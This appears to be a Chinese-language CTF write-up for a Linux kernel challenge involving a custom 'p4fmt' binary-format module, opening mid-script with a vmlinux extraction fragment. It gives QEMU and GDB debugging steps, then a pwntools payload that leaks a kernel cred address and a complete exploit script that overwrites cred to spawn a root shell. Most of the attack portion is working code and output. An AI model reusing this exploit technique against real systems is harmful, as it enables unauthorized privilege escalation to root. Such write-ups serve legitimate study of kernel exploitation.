### 优化后的文本

#### 脚本执行流程
```bash
then
    echo "Usage: $me" >&2
    exit 2
fi

# 准备临时文件:
tmp=$(mktemp /tmp/vmlinux-XXX)
trap "rm -f $tmp" 0

# 尝试解压文件：
try_decompress '\037\213\010' xy gunzip
try_decompress '\3757zXZ\000' abcde unxz
try_decompress 'BZh'          xy bunzip2
try_decompress '\135\0\0\0'   xxx unlzma
try_decompress '\211\114\132' xy 'lzop -d'
try_decompress '\002!L\030'   xxx 'lz4 -d'
try_decompress '(\265/\375'   xxx unzstd

# 检查未压缩的镜像或对象:
check_vmlinux $img

# 如果找不到 vmlinux，退出:
echo "$me: Cannot find vmlinux." >&2
```

#### 运行命令
```bash
kirin.sh ./bzImage > ./vmlinux
```

#### 修改 QEMU 启动脚本以调试内核
```bash
#!/bin/bash
qemu-system-x86_64 -s -kernel ./bzImage \
    -initrd ./kirin.cpio.gz \
    -nographic \
    -append "console=ttyS0 nokaslr"
```
- `-s`：启用 GDB 远程调试，默认监听端口为 1234。
- `nokaslr`：关闭内核地址随机化，便于调试。

#### 使用 GDB 连接并加载符号表
```bash
gdb ./vmlinux
target remote 127.0.0.1:1234
add-symbol-file ./p4fmt.ko 0xffffffffc0000000
```

#### 关于内存泄漏
在 `load_p4_binary` 函数中调用 `install_exec_creds` 时设置断点：
```bash
b *0xffffffffc00000af
```

运行一个满足上述格式的程序，并在 GDB 中查看汇编代码：
```bash
x/10i 0xffffffffc00000af
```

跟进 `0xffffffff81189ec0`：
```bash
x/10i 0xffffffff81189ec0
```

可以看到偏移位置为 `0xe0`。通过调试可以发现该偏移位置存储了 `cred` 结构体的地址。

#### 内存泄漏示例
```python
from pwn import *

payload = ""
payload += "P4"             
payload += p8(0)  # version
payload += p8(1)  # type
payload += p32(1)  # map_count
payload += p64(0x90)  # map_info_offset
payload += p64(0)     # entry
payload += "kirin"

print(payload.encode("base64"))
# 输出: UDQAAQEAAACQAAAAAAAAAAAAAAAAAAAAa2lyaW4=
```

将生成的 payload 写入文件并执行：
```bash
echo -n "UDQAAQEAAACQAAAAAAAAAAAAAAAAAAAAa2lyaW4=" | base64 -d > /tmp/kirin
chmod +x /tmp/kirin
/tmp/kirin
```

通过多次运行，可以观察到 `cred` 地址的规律：
```bash
/tmp $ ./kirin
[  310.536033] vm_mmap(load_addr=0x0, length=0xffff90e845d72300, offset=0x0, prot=0)
[  310.538726] kirin[559]: segfault at 0 ip 0000000000000000 sp 00007fffffffef91 error 14
[  310.543394] Code: Bad RIP value.
Segmentation fault
```

可以看到每五个地址会形成一个循环。因此，可以通过泄露一次地址来预测下一次 `cred` 的地址，并利用这个信息进行提权。

#### EXP 代码
```python
from pwn import *

def get_payload(addr):
    payload = "P4"
    payload += p8(0)  # version
    payload += p8(1)  # type
    payload += p32(2)  # map_info_num
    payload += p64(0x18)  # map_info_offset
    payload += p64(0x400048)  # entry
    payload += p64(0x400000 | 7)  # port=7->rwx
    payload += p64(0x1000)  # length
    payload += p64(0)  # offset
    payload += p64((addr | 8) + 0x10)  # cred
    payload += p64(0x48)  # overwrite_length
    payload += p64(0)
    payload += asm(shellcraft.amd64.sh(), arch="amd64")
    return payload.encode("base64").strip()

p = process("./run.sh")
p.sendlineafter("/ $ ", 'echo -n "UDQAAQEAAACQAAAAAAAAAAAAAAAAAAAAa2lyaW4=" | base64 -d > /tmp/kirin; chmod +x /tmp/kirin')
p.sendlineafter("/ $ ", "/tmp/kirin")
p.recvuntil("length=")
addr = int(p.recvuntil(",")[:-1], 16)
print(hex(addr))

exp = get_payload(addr)
cmd = 'echo -n "%s" | base64 -d > /tmp/exp; chmod +x /tmp/exp' % exp
p.sendlineafter("/ $ ", cmd)
p.recvuntil("$ ")

for i in range(10):
    p.sendline("/tmp/exp")
    p.recvuntil("/ ", timeout=1)
    ans = p.recv(2)
    print(ans[0])
    if ans[0] == '#':
        print("Get Shell Successfully")
        break
    if i == 9:
        print("Failed this time, please try again!")

p.interactive()
```

通过上述步骤和代码，可以实现对内核地址的泄露和提权操作。